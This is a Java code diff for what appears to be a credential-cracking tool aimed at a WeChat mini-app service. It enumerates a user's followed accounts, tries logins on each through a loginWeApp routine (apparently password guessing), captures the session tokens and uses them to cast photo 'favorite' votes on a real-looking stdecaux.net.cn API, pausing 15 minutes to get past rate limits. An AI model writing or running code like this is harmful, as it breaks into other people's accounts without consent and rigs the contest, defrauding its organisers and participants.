@@ -11,26 +11,14 @@ import com.alibaba.fastjson.JSONObject;
 import net.lqm.util.HttpUtils;
 import net.lqm.util.ReadFileUtil;
 
-public class CrackMain {
+public class CrackAndDelMain {
 	public static void main(String[] args) {
-		// 排除项
-		// List<String> l1 = ReadFileUtil.readTxtFile("D:\\Documents\\we\\psw.txt",
-		// false);
-
-		// 61066=michlie;61271=柠檬爸爸;61010=wangjunling3
-		for (String userId : getFavoriteUsers("67142")) {
+		for (String userId : getFavoriteUsers("66657")) {
 			try {
 				String name = getUserName(userId);
-				// ReadFileUtil.writeTxtFile("D:\\Documents\\we\\my.txt", name);
 				String str = loginWeApp(name);
-//				if (("17091869469").equals(str)) {
-//					break;
-//				}
 				if (str != null) {
-					// if(!l1.contains(str)){
-					System.out.println(str);
-					ReadFileUtil.writeTxtFile("D:\\Documents\\we\\67142.txt", str);
-					// }
+					votePhoto(str);
 				}
 			} catch (Exception e) {
 				e.printStackTrace();
@@ -78,10 +66,31 @@ public class CrackMain {
 
 		try {
 			map.get("content").get("token").toString();
-			return user;
+			System.out.println(user);
+			return map.get("content").get("token").toString();
 		} catch (Exception e) {
-			// System.out.println("password is wrong： "+user);
 		}
 		return null;
+	}
+	
+	private static void votePhoto(String token) {
+		String url = "http://smile.stdecaux.net.cn/stdecaux/api/photo/favoritePicture?token=" + token;
+		String param = "{\"parameters\":\"+9RYRteOWgzyO6yWNobDH96IN2ysZHu4S6cqEW2zaQKw+rx7okwKSxESXsqT cJmS\"}";
+		
+		String res2 = HttpUtils.sendPost(url, param);
+		if(res2.indexOf("200")>0) {
+			System.out.println("success");
+		}else if(res2.indexOf("201")>0) {
+//			System.out.println(res2);
+			System.out.println("over times");
+			try {
+				System.out.println("michlie wait 15mins");
+				Thread.sleep(1000*60*15);
+			} catch (InterruptedException e) {
+				e.printStackTrace();
+			}
+			return;
+		}else
+			System.out.println("michlie"+res2);
 	}
 }
